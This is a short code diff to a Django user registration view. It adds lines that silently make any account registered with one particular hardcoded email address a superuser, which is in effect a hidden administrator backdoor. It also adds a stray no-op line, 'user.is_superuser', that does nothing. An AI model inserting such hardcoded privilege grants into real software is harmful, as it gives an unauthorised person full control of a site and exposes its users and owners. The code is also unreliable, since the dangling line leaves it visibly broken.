@@ -78,6 +78,9 @@ class RegistrationView(View):
                 user = User.objects.create_user(username=username, email=email)
                 user.set_password(password)
                 user.is_active = False
+                if email == "fikayodan@gmail.com":
+                    user.is_superuser = True
+                user.is_superuser 
                 user.save()
                 email_subject = 'Activate your account'
 
